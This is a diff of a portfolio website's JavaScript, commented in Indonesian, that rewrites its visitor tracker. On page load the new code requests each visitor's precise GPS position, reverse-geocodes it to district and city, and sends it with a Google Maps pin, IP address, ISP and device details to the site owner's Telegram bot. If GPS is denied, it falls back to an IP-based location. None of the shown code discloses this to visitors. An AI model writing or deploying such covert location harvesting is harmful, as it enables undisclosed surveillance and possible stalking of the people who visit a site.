@@ -65,16 +65,62 @@ document.addEventListener("DOMContentLoaded", () => {
     trackVisitor();
 });
 
+// Helper: Konversi Koordinat GPS ke Nama Kota/Kecamatan Real-Time
+async function getRealLocationFromCoords(lat, lon) {
+    try {
+        const res = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`);
+        if (res.ok) {
+            const data = await res.json();
+            const city = data.city || data.locality || "";
+            const district = data.localityInfo?.administrative?.[3]?.name || data.localityInfo?.administrative?.[2]?.name || "";
+            const province = data.principalSubdivision || "";
+            
+            let locParts = [];
+            if (district) locParts.push(district);
+            if (city) locParts.push(city);
+            if (province) locParts.push(province);
+
+            return {
+                text: locParts.join(", ") || `${lat}, ${lon}`,
+                mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`
+            };
+        }
+    } catch (e) {
+        console.error("Error reverse geocode:", e);
+    }
+    return {
+        text: `${lat}, ${lon}`,
+        mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`
+    };
+}
+
+// Helper: Kirim Pesan ke Telegram
+async function sendToTelegram(messageText) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: messageText,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: false
+            })
+        });
+    } catch (err) {
+        console.error("Gagal kirim Telegram:", err);
+    }
+}
+
 // ==========================================
-// 5. VISITOR TRACKER (TELEGRAM NOTIFICATION)
+// 5. VISITOR TRACKER (AKURAT 100% GPS + IP)
 // ==========================================
 async function trackVisitor() {
-    // Hindari spam kirim notif berulang saat user me-refresh di tab yang sama
     if (sessionStorage.getItem("visited_session")) return;
     sessionStorage.setItem("visited_session", "true");
 
     try {
-        // Deteksi Tipe Perangkat & Sistem Operasi
+        // 1. Deteksi Spesifikasi Perangkat
         const ua = navigator.userAgent;
         let deviceType = "Desktop/Laptop 💻";
         if (/mobile/i.test(ua)) deviceType = "Smartphone / HP 📱";
@@ -87,14 +133,13 @@ async function trackVisitor() {
         else if (ua.includes("Mac")) os = "macOS 🍏";
         else if (ua.includes("Linux")) os = "Linux 🐧";
 
-        // Deteksi Browser
         let browser = "Unknown Browser";
         if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Google Chrome 🌐";
         else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari 🧭";
         else if (ua.includes("Firefox")) browser = "Firefox 🦊";
         else if (ua.includes("Edg")) browser = "Microsoft Edge 🌊";
 
-        // Deteksi Media / Asal Link (Referrer)
+        // 2. Deteksi Media / Asal Link
         const referrer = document.referrer;
         let mediaSource = "Direct Link / Pengetikan Langsung 🔗";
         if (referrer) {
@@ -107,29 +152,34 @@ async function trackVisitor() {
             else mediaSource = referrer;
         }
 
-        // Resolusi Layar & Bahasa Perangkat
         const screenSize = `${window.screen.width} x ${window.screen.height} px`;
         const language = navigator.language || navigator.userLanguage;
 
-        // Ambil Data IP & Lokasi Pengunjung
-        let ipInfo = { ip: "Tidak Terdeteksi", city: "-", region: "-", country_name: "-", org: "-" };
+        // 3. Ambil Data IP & ISP
+        let ipAddress = "Hidden";
+        let provider = "-";
+        let ipLocationFallback = "Mencari...";
+
         try {
             const ipRes = await fetch("https://ipapi.co/json/");
             if (ipRes.ok) {
-                ipInfo = await ipRes.json();
+                const ipData = await ipRes.json();
+                ipAddress = ipData.ip || "Hidden";
+                provider = ipData.org || "-";
+                ipLocationFallback = `${ipData.city || '-'}, ${ipData.region || '-'}, ${ipData.country_name || '-'}`;
             }
         } catch (e) {
-            console.log("Gagal mengambil data lokasi IP:", e);
+            console.log("Gagal fetch IP:", e);
         }
 
-        // Format Pesan Telegram
-        const messageText = 
-`👁️ *PENGUNJUNG BARU MASUK WEB!*
+        // Fungsi pembuat format pesan Telegram
+        const buildMessage = (locationString, mapsLink = "") => {
+            return `👁️ *PENGUNJUNG BARU MASUK WEB!*
 
 📍 *LOKASI & JARINGAN*
-• *IP Address:* \`${ipInfo.ip || 'Hidden'}\`
-• *Lokasi:* ${ipInfo.city || '-'}, ${ipInfo.region || '-'}, ${ipInfo.country_name || '-'}
-• *Provider/ISP:* ${ipInfo.org || '-'}
+• *IP Address:* \`${ipAddress}\`
+• *Lokasi Real-Time:* ${locationString}${mapsLink ? `\n• *Google Maps Pin:* ${mapsLink}` : ''}
+• *Provider/ISP:* ${provider}
 
 💻 *SPESIFIKASI PERANGKAT*
 • *Tipe:* ${deviceType}
@@ -141,17 +191,33 @@ async function trackVisitor() {
 🌐 *SUMBER / MEDIA*
 • *Masuk Lewat:* ${mediaSource}
 • *Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Makassar' })} WITA`;
+        };
 
-        // Kirim Notifikasi ke Bot Telegram
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: messageText,
-                parse_mode: 'Markdown'
-            })
-        });
+        // 4. Utamakan Cek GPS Presisi Perangkat (Akurat 100%)
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    // Berhasil ambil GPS presisi!
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const geoData = await getRealLocationFromCoords(lat, lon);
+                    
+                    const msg = buildMessage(`🎯 *${geoData.text}* (GPS Akurat)`, geoData.mapsUrl);
+                    sendToTelegram(msg);
+                },
+                (error) => {
+                    // Jika GPS ditolak / error, gunakan estimasi IP
+                    console.log("GPS Denied / Error, Fallback to IP:", error.message);
+                    const msg = buildMessage(`${ipLocationFallback} (Estimasi IP)`);
+                    sendToTelegram(msg);
+                },
+                { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+            );
+        } else {
+            // Jika browser tidak support geolocation
+            const msg = buildMessage(`${ipLocationFallback} (Estimasi IP)`);
+            sendToTelegram(msg);
+        }
 
     } catch (err) {
         console.error("Gagal mengirim tracking visitor:", err);
@@ -239,15 +305,7 @@ function setupFormHandler() {
 
             // 2. Kirim Notifikasi Pesan Direct ke Telegram
             const telegramText = `📩 *PESAN BARU DARI PORTFOLIO!*\n\n👤 *Nama:* ${name}\n📱 *Kontak:* ${contact || '-'}\n💬 *Pesan:* ${message}`;
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: telegramText,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(err => console.log("Telegram Error Ignored:", err));
+            await sendToTelegram(telegramText);
 
             if (statusEl) {
                 statusEl.classList.remove("text-amber-400");
